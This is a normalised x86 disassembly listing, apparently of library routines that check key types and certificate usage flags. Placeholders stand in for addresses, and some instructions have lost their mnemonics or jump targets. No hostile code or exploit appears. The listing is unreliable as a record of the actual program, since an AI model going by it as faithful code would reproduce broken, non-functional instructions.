lea eax [ esi + esi * 2 ]
shl eax 0x3
mov ecx [ eax + rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ eax ]
mov esi [ ecx + 0x8 ]
mov edx [ eax + 0x4 ]
mov esi [ edx + 0x8 ]
jmp r-xdata
mov dl bl
and edx 0x7f
or esi edx
mov al bl
and eax 0x7f
push eax
push edi
call sub_10035b20
add esp 0x8
test eax eax
je r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x35b
jge r-xdata
push 0x16c
mov edx [ eax + 0x4 ]
mov edi [ edx + 0x4 ]
jmp r-xdata
mov edi [ eax + rw-data ]
push 0x15b
jmp r-xdata
cmp esi ebx
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x74 ]
jmp r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x60
retn
push edi
call sub_10029950
add esp 0x4
xor edi edi
lea edx [ esp + 0x14 ]
lea ecx [ esp + 0x3c ]
push edx
push eax
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x4c ] esi
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
lea eax [ esi + esi * 2 ]
shl eax 0x3
mov ecx [ eax + rw-data ]
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x74 ]
test eax eax
je r-xdata
push r--data
push 0x65
push 0x66
push 0x8
call sub_1001de60
add esp 0x14
jmp r-xdata
test ecx ecx
je r-xdata
cmp esi 0x50
mov [ esp + 0x1c ] 0x0
jb r-xdata
push 0x7
push edi
push edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
cmp esi 0x1ffffff
jbe r-xdata
test bl 0x80
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
pop edi
dec ecx
pop esi
pop ebp
mov eax ecx
pop ebx
add esp 0x60
retn
mov ecx [ esp + 0x78 ]
push ecx
push edi
push eax
call sub_100267d0
add esp 0xc
push 0x14c
mov eax [ eax + 0x4 ]
mov edi [ eax ]
jmp r-xdata
mov edi [ eax + rw-data ]
jmp r-xdata
push 0x13b
jmp r-xdata
push esi
push r--data
lea eax [ esp + 0x5c ]
push 0x1a
push eax
call sub_100279b0
lea edi [ esp + 0x64 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
dec ecx
test ebp ebp
mov esi ecx
je r-xdata
push edi
call sub_100355c0
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov eax 0xcccccccd
mul esi
mov ebx edx
shr ebx 0x5
mov eax ebx
neg eax
shl eax 0x2
sub eax ebx
lea esi [ esi + eax * 8 ]
test ecx ecx
mov ebx 0x2
je r-xdata
mov ecx [ esp + 0x74 ]
jmp r-xdata
shl esi 0x7
jmp r-xdata
test edi edi
jne r-xdata
push r--data
push 0x65
push 0x68
push 0x8
call sub_1001de60
add esp 0x14
add [ esp + 0x10 ] esi
mov edi [ esp + 0x78 ]
test edi edi
jle r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
test ebp ebp
mov esi ecx
je r-xdata
inc [ esp + 0x10 ]
mov eax [ esp + 0x78 ]
test eax eax
jle r-xdata
sub esi 0x50
jmp r-xdata
push 0x50
push edi
call sub_10035be0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov bl [ eax ]
inc eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x80 ]
dec eax
mov [ esp + 0x80 ] eax
jne r-xdata
push esi
push edi
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
call sub_100299b0
test eax eax
mov [ esp + 0x7c ] eax
je r-xdata
mov edi [ esp + 0x7c ]
mov eax [ esp + 0x7c ]
test eax eax
je r-xdata
lea ecx [ esp + 0x54 ]
push edi
push ecx
push ebp
call sub_100267d0
add esp 0xc
cmp esi edi
jle r-xdata
mov ecx [ esp + 0x10 ]
push ebx
lea edx [ ecx + esi + 0x1 ]
mov [ esp + 0x14 ] edx
call sub_1001d740
add esp 0x4
jmp r-xdata
mov edi [ esp + 0x78 ]
test edi edi
jle r-xdata
add bl 0x30
mov [ ebp ] bl
inc ebp
dec eax
mov [ esp + 0x78 ] eax
test ebp ebp
je r-xdata
mov ecx [ esp + 0x74 ]
jmp r-xdata
mov [ esp + 0x74 ] 0x1
mov edi eax
push eax
call sub_10029950
add esp 0x4
add ebp esi
sub edi esi
mov [ esp + 0x78 ] edi
add ebp edi
mov [ esp + 0x78 ] 0x0
jmp r-xdata
mov eax [ esp + 0x80 ]
test eax eax
jg r-xdata
push edi
push ebx
push ebp
call sub_100267d0
add esp 0xc
cmp esi edi
jle r-xdata
mov [ ebp ] 0x2e
inc ebp
dec edi
add ebp esi
sub edi esi
mov [ esp + 0x78 ] edi
add ebp edi
mov [ esp + 0x78 ] 0x0
jmp r-xdata
sub_10023290
mov eax 0x24
call sub_1001d0d0
mov ecx [ esp + 0x28 ]
lea eax [ esp + 0xc ]
mov [ esp ] eax
mov eax [ rw-data ]
test eax eax
mov [ esp + 0xc ] ecx
je r-xdata
push 0x0
push sub_10022da0
push 0x4
push 0x354
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_10023370
add esp 0x18
test eax eax
jne r-xdata
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
push ecx
push eax
mov [ esp + 0xc ] 0x1
mov [ esp + 0x10 ] edx
call sub_1001ff80
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax ]
mov eax [ ecx + 0x8 ]
add esp 0x24
retn
add esp 0x24
retn
mov edx [ eax + 0x4 ]
mov eax [ edx + 0x8 ]
add esp 0x24
retn
sub_10023310
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push esi
push edi
mov edx [ eax ]
mov esi [ ecx ]
mov ecx [ edx + 0xc ]
mov edi [ esi + 0xc ]
mov eax ecx
sub eax edi
jne r-xdata
pop edi
pop esi
retn
mov edi [ esi + 0x10 ]
mov esi [ edx + 0x10 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
sbb eax eax
sbb eax 0xffffffff
sub_10023340
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push 0x0
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_10023370
add esp 0x18
retn
sub_10023370
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
xor esi esi
xor edi edi
test ebp ebp
jne r-xdata
push ebx
xor ebx ebx
test ebp ebp
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
test [ esp + 0x28 ] 0x2
je r-xdata
lea eax [ ebx + ebp ]
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x18 ]
sar esi 0x1
mov edi esi
imul edi [ esp + 0x20 ]
add edi eax
mov eax [ esp + 0x14 ]
push edi
push eax
call [ esp + 0x2c ]
add esp 0x8
test eax eax
jge r-xdata
mov eax edi
pop ebx
pop edi
pop esi
pop ebp
retn
mov ebp [ esp + 0x20 ]
test esi esi
jle r-xdata
jle r-xdata
mov ebp esi
jmp r-xdata
imul esi ebp
add esi [ esp + 0x18 ]
mov edi esi
lea edi [ esi - 0x1 ]
mov eax [ esp + 0x18 ]
imul edi ebp
mov ebx ebp
neg ebx
add edi eax
test eax eax
je r-xdata
lea ebx [ esi + 0x1 ]
cmp ebx ebp
jl r-xdata
dec esi
add edi ebx
test esi esi
jg r-xdata
test [ esp + 0x28 ] 0x1
jne r-xdata
mov ecx [ esp + 0x14 ]
push edi
push ecx
call [ esp + 0x2c ]
add esp 0x8
test eax eax
jne r-xdata
xor edi edi
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10023420
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
cmp eax 0x6
jne r-xdata
cmp eax 0x74
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_10029870
add esp 0x4
pop edi
pop esi
retn
cmp eax 0x198
jne r-xdata
mov edx [ edi + 0xc ]
mov eax [ edx + 0xc ]
push eax
call sub_10029870
add esp 0x4
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
call sub_100299b0
mov esi eax
test esi esi
je r-xdata
call sub_1001df60
mov ecx [ edi + 0xc ]
push ecx
call sub_1002cb10
push 0x0
push esi
push eax
call sub_1002cb20
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_10029870
push esi
mov edi eax
call sub_10029950
add esp 0x8
mov eax edi
pop edi
pop esi
retn
sub_100234b0
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx ]
cmp eax 0x6
jne r-xdata
cmp eax 0x74
jne r-xdata
mov eax [ ecx + 0xc ]
push eax
call sub_10024800
add esp 0x4
retn
cmp eax 0x198
jne r-xdata
mov ecx [ ecx + 0xc ]
push ecx
call sub_1002e570
add esp 0x4
retn
mov edx [ ecx + 0xc ]
push edx
call sub_10036330
add esp 0x4
retn
sub_10023500
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
mov ecx [ ebx ]
push edi
cmp [ esi ] ecx
je r-xdata
cmp ecx 0x74
jne r-xdata
push 0xa8
push r--data
push 0x65
push 0x67
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
cmp ecx 0x198
jne r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
cmp [ esi ] 0x74
jne r-xdata
mov eax [ ebx + 0xc ]
push eax
call sub_1002cb10
add esp 0x4
test eax eax
jne r-xdata
push 0xae
push r--data
push 0x67
push 0x67
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
cmp [ esi ] 0x198
jne r-xdata
mov ecx [ ebx + 0xc ]
mov edx [ ecx + 0xc ]
push edx
call sub_10029b30
mov edi eax
add esp 0x4
test edi edi
je r-xdata
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov ecx [ ebx + 0xc ]
push ecx
call sub_1002cb10
push eax
call sub_1002c890
mov edi eax
add esp 0x8
test edi edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov eax [ esi + 0xc ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
push edi
push edx
call sub_10029430
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
mov [ ecx + 0xc ] edi
mov edx [ ebx + 0xc ]
mov eax [ edx + 0x10 ]
push eax
call sub_10029b30
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push eax
call sub_10029950
add esp 0x4
push edi
call sub_1002c3f0
add esp 0x4
mov ecx [ esi + 0xc ]
mov eax [ ecx + 0x10 ]
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
mov [ edx + 0x10 ] edi
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_10029b30
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push eax
call sub_10029950
add esp 0x4
mov edx [ esi + 0xc ]
mov eax [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
mov [ eax + 0x14 ] edi
push eax
call sub_10029950
add esp 0x4
sub_10023670
mov ecx [ esp + 0x4 ]
push esi
mov edx [ ecx ]
cmp edx 0x74
jne r-xdata
cmp edx 0x198
jne r-xdata
mov eax [ ecx + 0xc ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx + 0xc ]
push eax
call sub_1002cb10
add esp 0x4
test eax eax
jne r-xdata
mov eax 0x1
pop esi
retn
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
retn
mov esi [ eax + 0x14 ]
test esi esi
jne r-xdata
sub_100236c0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov eax [ edi ]
cmp eax 0x74
jne r-xdata
cmp eax 0x198
jne r-xdata
cmp [ esi ] 0x74
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
cmp [ esi ] 0x198
jne r-xdata
mov eax [ esi + 0xc ]
mov edx [ edi + 0xc ]
mov ecx [ eax + 0xc ]
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
push eax
call sub_1002cb10
mov ecx [ esi + 0xc ]
mov edi eax
push ecx
call sub_1002cb10
push 0x0
push eax
push edi
call sub_1002cce0
add esp 0x14
neg eax
sbb eax eax
pop edi
inc eax
pop esi
retn
pop edi
xor eax eax
pop esi
retn
mov ecx [ esi + 0xc ]
mov eax [ edi + 0xc ]
mov edx [ ecx + 0x10 ]
mov ecx [ eax + 0x10 ]
push edx
push ecx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
mov ecx [ edi + 0xc ]
mov eax [ edx + 0x14 ]
mov edx [ ecx + 0x14 ]
push eax
push edx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_10023770
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
mov ecx [ esi ]
mov eax [ edi ]
cmp eax ecx
je r-xdata
push esi
push edi
call sub_100236c0
add esp 0x8
test eax eax
je r-xdata
pop edi
or eax 0xffffffff
pop esi
retn
pop edi
xor eax eax
pop esi
retn
mov eax [ edi ]
cmp eax 0x74
jg r-xdata
cmp eax 0x198
je r-xdata
je r-xdata
mov ecx [ esi + 0xc ]
push ebx
push ecx
call sub_1002cb10
mov edx [ edi + 0xc ]
mov ebx eax
push edx
call sub_1002b600
mov edi eax
mov eax [ esi + 0xc ]
push eax
call sub_1002b600
push 0x0
push eax
push edi
push ebx
call sub_1002da40
add esp 0x1c
test eax eax
pop ebx
je r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
mov eax [ edi + 0xc ]
mov edx [ esi + 0xc ]
mov ecx [ eax + 0x18 ]
mov eax [ edx + 0x18 ]
push ecx
push eax
cmp eax 0x6
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
dec eax
pop edi
neg eax
sbb eax eax
pop esi
and al 0xfe
retn
mov ecx [ edi + 0xc ]
mov eax [ esi + 0xc ]
mov edx [ ecx + 0x10 ]
mov ecx [ eax + 0x10 ]
push edx
push ecx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
cmp eax 0x1c
jne r-xdata
mov edx [ edi + 0xc ]
mov ecx [ esi + 0xc ]
mov eax [ edx + 0x14 ]
mov edx [ ecx + 0x14 ]
push eax
push edx
jmp r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
call sub_1002a000
add esp 0x8
test eax eax
je r-xdata
sub_10023850
push 0x13d
push r--data
push 0x18
call sub_1001d4c0
xor edx edx
add esp 0xc
cmp eax edx
jne r-xdata
mov ecx 0x1
mov [ eax ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x10 ] ecx
retn
push 0x140
push r--data
push 0x41
push 0x6a
push 0x6
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_100238a0
mov eax [ esp + 0x4 ]
cmp eax 0x46
jg r-xdata
cmp eax 0x71
je r-xdata
je r-xdata
mov eax 0x74
retn
cmp eax 0x74
je r-xdata
add eax 0xfffffffa
cmp eax 0x3d
ja r-xdata
cmp eax 0x198
je r-xdata
xor eax eax
retn
xor ecx ecx
mov cl [ eax + lookup_table_10023900 ]
jmp [ ecx * 4 + jump_table_100238f0 ]
mov eax 0x198
retn
mov eax 0x6
retn
mov eax 0x1c
retn
sub_10023940
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x1c6
push r--data
push 0xa
lea eax [ esi + 0x8 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
mov eax [ esi ]
cmp eax 0x46
jg r-xdata
cmp eax 0x71
je r-xdata
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_10036560
cmp eax 0x74
je r-xdata
add eax 0xfffffffa
cmp eax 0x3c
ja r-xdata
push esi
call sub_1001d740
add esp 0x4
push sub_10036660
push eax
call sub_1001e730
add esp 0x8
cmp eax 0x198
jne r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_100239fc ]
jmp [ ecx * 4 + jump_table_100239ec ]
mov ecx [ esi + 0xc ]
push ecx
call sub_10028ff0
jmp r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_100296b0
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
call sub_10024660
jmp r-xdata
add esp 0x4
sub_10023a40
mov eax 0x1c
call sub_1001d0d0
push esi
mov esi [ esp + 0x24 ]
mov eax [ esi + 0x28 ]
test ah 0x1
jne r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0xffffffff
jne r-xdata
push 0x70
push r--data
push 0x3
push 0x9
call sub_1001f5b0
push esi
call sub_10023b40
push 0x72
push r--data
push 0x3
push 0xa
call sub_1001f5b0
add esp 0x24
cmp eax 0x1
jl r-xdata
mov eax 0x1
pop esi
add esp 0x1c
retn
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp eax 0x8
jg r-xdata
or eax 0xffffffff
pop esi
add esp 0x1c
retn
lea ecx [ esp + 0x4 ]
push ecx
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
je r-xdata
dec eax
jmp r-xdata
add eax 0x8
cmp eax 0xffffffff
jne r-xdata
test eax eax
jge r-xdata
cmp eax 0x8
jge r-xdata
mov ecx [ esp + 0x2c ]
xor eax eax
push ecx
push esi
push eax
call [ eax + 0xc ]
add esp 0xc
pop esi
add esp 0x1c
retn
add eax 0xfffffff8
push eax
mov eax [ rw-data ]
push eax
call sub_1001e7c0
mov ecx [ esp + 0x34 ]
add esp 0x8
push ecx
push esi
push eax
call [ eax + 0xc ]
add esp 0xc
pop esi
add esp 0x1c
retn
mov ecx [ esp + 0x2c ]
lea edx [ eax * 8 ]
sub edx eax
push ecx
push esi
lea eax [ edx * 4 + rw-data ]
push eax
call [ eax + 0xc ]
add esp 0xc
pop esi
add esp 0x1c
retn
sub_10023b40
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x28 ]
test ah 0x1
jne r-xdata
pop esi
retn
push ebx
push ebp
xor ebp ebp
push edi
lea eax [ esi + 0x44 ]
push ebp
push eax
call sub_100254d0
push eax
push esi
call sub_1002f720
push esi
call sub_10021330
add esp 0x14
push eax
push esi
call sub_10021340
add esp 0x4
push eax
call sub_10021390
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esi ]
mov edx [ ecx ]
push edx
call sub_1002f4d0
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esi + 0x28 ]
or al 0x20
mov [ esi + 0x28 ] eax
push ebp
push ebp
push 0x57
push esi
call sub_100367d0
mov edi eax
add esp 0x10
or ebx 0xffffffff
cmp edi ebp
je r-xdata
mov eax [ esi + 0x28 ]
or al 0x40
mov [ esi + 0x28 ] eax
push ebp
push ebp
push 0x297
push esi
call sub_100367d0
mov edi eax
add esp 0x10
cmp edi ebp
je r-xdata
cmp [ edi ] ebp
je r-xdata
push ebp
push ebp
push 0x53
push esi
call sub_100367d0
add esp 0x10
cmp eax ebp
je r-xdata
test [ esi + 0x28 ] 0x10
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebp
je r-xdata
mov eax [ esi + 0x28 ]
or al 0x10
mov [ esi + 0x28 ] eax
push ebp
push ebp
push 0x7e
push esi
mov [ esi + 0x30 ] ebp
call sub_100367d0
mov edi eax
add esp 0x10
test edi edi
mov ebp 0x8
je r-xdata
cmp [ eax ] ebp
jle r-xdata
mov eax [ esi + 0x28 ]
or al 0x80
mov [ esi + 0x28 ] eax
push ebp
push 0x55
push esi
call sub_10036790
add esp 0xc
test eax eax
jge r-xdata
mov [ esi + 0x20 ] ebx
cmp [ eax + 0x4 ] 0x102
je r-xdata
xor ebx ebx
push ebx
push ebx
push 0x47
push esi
call sub_100367d0
add esp 0x10
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x28 ]
push edi
or ecx 0x4
xor ebx ebx
mov [ esi + 0x28 ] ecx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov [ esi + 0x2c ] ebp
mov ecx [ eax + 0x8 ]
xor edx edx
mov dl [ ecx ]
mov ecx edx
mov [ esi + 0x2c ] ecx
mov edx [ eax ]
cmp edx 0x1
jle r-xdata
mov [ esi + 0x24 ] ebx
push eax
call sub_1002f4d0
add esp 0x4
mov [ esi + 0x24 ] eax
jmp r-xdata
push ebp
push 0x56
push esi
call sub_10036790
add esp 0xc
test eax eax
jl r-xdata
mov eax [ esi + 0x28 ]
mov [ esi + 0x20 ] ebp
or al 0x80
mov [ esi + 0x28 ] eax
jmp r-xdata
cmp [ edi ] ebp
je r-xdata
push ebx
push ebx
push 0x52
push esi
call sub_100367d0
push ebx
push ebx
push 0x5a
push esi
mov [ esi + 0x38 ] eax
call sub_100367d0
push esi
mov [ esi + 0x3c ] eax
call sub_10036770
add esp 0x24
test eax eax
jle r-xdata
cmp [ eax ] ebx
jle r-xdata
push sub_10030910
push edi
call sub_1001e730
add esp 0x8
push ebx
push edi
call sub_1001e7c0
push eax
call sub_10022ae0
add eax 0xffffff7f
add esp 0xc
cmp eax 0xa8
ja r-xdata
mov edx [ esi + 0x28 ]
push eax
or edx 0x2
mov [ esi + 0x28 ] edx
call sub_1002ef30
add esp 0x4
mov edx [ eax + 0x8 ]
xor ebx ebx
mov bh [ edx + 0x1 ]
or ebx ecx
mov [ esi + 0x2c ] ebx
jmp r-xdata
push edi
call sub_10036830
mov eax [ esi + 0x28 ]
add esp 0x4
or ah 0x4
mov [ esi + 0x28 ] eax
mov eax [ edi ]
cmp eax ebp
je r-xdata
push edi
call sub_10036860
mov eax [ esi + 0x28 ]
add esp 0x4
or al 0x1
mov [ esi + 0x28 ] eax
push eax
call sub_1002f4d0
add esp 0x4
mov [ esi + 0x20 ] eax
jmp r-xdata
mov eax [ esi + 0x28 ]
pop edi
or ah 0x1
pop ebp
mov [ esi + 0x28 ] eax
pop ebx
push ebx
push esi
call sub_100367b0
mov edi eax
push edi
call sub_10036750
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0x34 ] ebx
mov edx [ eax + 0x8 ]
xor ecx ecx
mov cl [ edx ]
mov [ esi + 0x34 ] ecx
jmp r-xdata
push edi
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
xor ecx ecx
mov cl [ eax + lookup_table_10023e74 ]
jmp [ ecx * 4 + jump_table_10023e50 ]
push esi
inc ebx
call sub_10036770
add esp 0x4
cmp ebx eax
jge r-xdata
push edi
call sub_10036740
push eax
call sub_10022ae0
add esp 0x8
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x28 ]
push eax
or edx ebp
mov [ esi + 0x28 ] edx
call sub_1002ef30
add esp 0x4
mov eax [ esi + 0x30 ]
or al 0x1
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x2
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x4
jmp r-xdata
mov eax [ esi + 0x30 ]
or eax ebp
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x10
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x20
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x40
jmp r-xdata
mov eax [ esi + 0x30 ]
or al 0x80
jmp r-xdata
mov eax [ esi + 0x28 ]
or ah 0x2
mov [ esi + 0x28 ] eax
push sub_10030070
push 0x4
push 0x9
lea edx [ esp + 0x20 ]
push rw-data
push edx
call sub_10023340
add esp 0x14
test eax eax
je r-xdata
mov [ esi + 0x30 ] eax
sub_10023f20
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x28 ]
test ah 0x1
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx eax
and ecx 0x2
je r-xdata
push 0x1e0
push r--data
push 0x3
push 0x9
call sub_1001f5b0
push esi
call sub_10023b40
push 0x1e2
push r--data
push 0x3
push 0xa
call sub_1001f5b0
add esp 0x24
test al 0x1
je r-xdata
test [ esi + 0x2c ] 0x4
je r-xdata
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
and eax 0xff
pop esi
shr eax 0x4
and eax 0x1
retn
xor eax eax
pop esi
retn
test ecx ecx
je r-xdata
mov eax 0x3
pop esi
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
test [ esi + 0x34 ] 0x7
je r-xdata
mov eax 0x5
pop esi
retn
sub_10023fb0
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x28 ]
test al 0x4
je r-xdata
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
test [ ecx + 0x30 ] 0x2
jne r-xdata
test al 0x2
mov dl 0x80
je r-xdata
push esi
mov esi eax
and esi 0x2
je r-xdata
xor eax eax
retn
test al 0x8
je r-xdata
push ebx
mov bl [ ecx + 0x2c ]
test dl bl
pop ebx
jne r-xdata
test al 0x1
je r-xdata
test [ ecx + 0x2c ] 0x4
je r-xdata
mov eax 0x1
retn
test [ ecx + 0x34 ] dl
jne r-xdata
xor eax eax
retn
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
test al 0x10
je r-xdata
xor eax eax
xor eax eax
retn
test esi esi
je r-xdata
mov eax 0x3
pop esi
retn
mov eax 0x1
pop esi
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
mov ecx [ ecx + 0x34 ]
test cl 0x7
je r-xdata
test cl 0x4
mov eax 0x5
jne r-xdata
pop esi
retn
sub_10024050
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x28 ]
test al 0x4
je r-xdata
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
test [ ecx + 0x30 ] 0x11
jne r-xdata
test al 0x8
je r-xdata
push esi
mov esi eax
and esi 0x2
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
test [ ecx + 0x34 ] 0x40
jne r-xdata
test al 0x1
je r-xdata
test [ ecx + 0x2c ] 0x4
je r-xdata
mov eax 0x1
retn
test [ ecx + 0x2c ] 0xa0
jne r-xdata
xor eax eax
retn
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
test al 0x10
je r-xdata
xor eax eax
xor eax eax
retn
test esi esi
je r-xdata
mov eax 0x3
pop esi
retn
mov eax 0x1
pop esi
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
mov ecx [ ecx + 0x34 ]
test cl 0x7
je r-xdata
test cl 0x4
mov eax 0x5
jne r-xdata
pop esi
retn
sub_100240e0
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x28 ]
test al 0x4
je r-xdata
mov edx [ esp + 0xc ]
test edx edx
je r-xdata
test [ ecx + 0x30 ] 0x11
jne r-xdata
test al 0x8
je r-xdata
push esi
mov esi eax
and esi 0x2
je r-xdata
xor eax eax
retn
and eax 0x2
je r-xdata
test [ ecx + 0x34 ] 0x40
jne r-xdata
test al 0x1
je r-xdata
test [ ecx + 0x2c ] 0x4
je r-xdata
test eax eax
je r-xdata
test [ ecx + 0x2c ] 0xa0
jne r-xdata
xor eax eax
retn
mov edx eax
and edx 0x60
cmp dl 0x60
jne r-xdata
test al 0x10
je r-xdata
xor eax eax
mov eax 0x1
retn
test [ ecx + 0x2c ] 0x20
jne r-xdata
xor eax eax
retn
test esi esi
je r-xdata
mov eax 0x3
pop esi
retn
mov eax 0x1
pop esi
retn
xor eax eax
retn
test al 0x8
je r-xdata
mov eax 0x4
pop esi
retn
mov ecx [ ecx + 0x34 ]
test cl 0x7
je r-xdata
test cl 0x4
mov eax 0x5
jne r-xdata
pop esi
retn
sub_10024180
push ebx
push esi
mov esi [ esp + 0x10 ]
mov eax 0x4
mov ecx [ esi + 0x28 ]
test al cl
je r-xdata
mov edx [ esp + 0x14 ]
test edx edx
je r-xdata
test [ esi + 0x30 ] al
je r-xdata
test cl 0x8
je r-xdata
mov edx ecx
and edx 0x2
je r-xdata
xor eax eax
mov eax 0x1
mov eax [ esi + 0x34 ]
test al 0x20
jne r-xdata
test cl 0x1
je r-xdata
test [ esi + 0x2c ] al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x2c ] 0xc0
jne r-xdata
test al 0x80
je r-xdata
mov ebx ecx
and ebx 0x60
cmp bl 0x60
jne r-xdata
test cl 0x10
je r-xdata
mov eax 0x2
jmp r-xdata
test edx edx
jne r-xdata
pop esi
mov eax 0x3
pop ebx
retn
pop esi
mov eax 0x1
pop ebx
retn
test cl 0x2
je r-xdata
test cl 0x8
je r-xdata
mov ecx [ esi + 0x34 ]
test cl 0x7
je r-xdata
test cl 0x2
mov eax 0x5
jne r-xdata
pop esi
xor eax eax
pop ebx
retn
sub_10024220
push ebx
push esi
mov esi [ esp + 0x10 ]
mov eax 0x4
mov ecx [ esi + 0x28 ]
test al cl
je r-xdata
mov edx [ esp + 0x14 ]
test edx edx
je r-xdata
test [ esi + 0x30 ] al
je r-xdata
test cl 0x8
je r-xdata
mov edx ecx
and edx 0x2
je r-xdata
xor eax eax
mov eax 0x1
mov eax [ esi + 0x34 ]
test al 0x20
jne r-xdata
